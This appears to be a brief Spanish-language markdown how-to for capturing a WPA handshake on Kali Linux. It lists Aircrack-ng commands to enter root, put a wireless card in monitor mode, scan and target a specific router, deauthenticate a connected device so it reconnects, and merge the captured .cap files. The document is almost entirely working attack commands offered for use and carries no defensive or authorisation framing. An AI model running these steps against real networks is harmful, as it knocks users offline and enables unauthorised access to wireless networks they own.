# WPA Handshake

## Requerimientos
- Aircrack-ng
- mergecap
- Drivers para la tarjeta de red (kali)

## Proceso

### Ingresar como root

```bash
sudo su
```
### Activar modo monitor

```bash
airmon-ng
airmon-ng start {nombreInerfaz}
```
Aquí puede que se genere un nuevo nombre para la interfaz

### Escanear las redes cercanas

```bash
airodump-ng {nombreNuevaInterfaz}
```
### Enfocarse en una red

```bash
airodump-ng -c {channel} --bssid {macRouter} -w {nombreCaptura} {nombreNuevaInterfaz}
```

### Des-Autenticar algún dispositivo conectado

```bash
aireplay-ng -0 1 -a {macRouter} -c {macDispositivo} {nombreNuevaInterfaz}
```

### Juntar varios archivos .cap en uno solo

```bash
mergecap -F pcap *.cap -w {nombre}.cap
```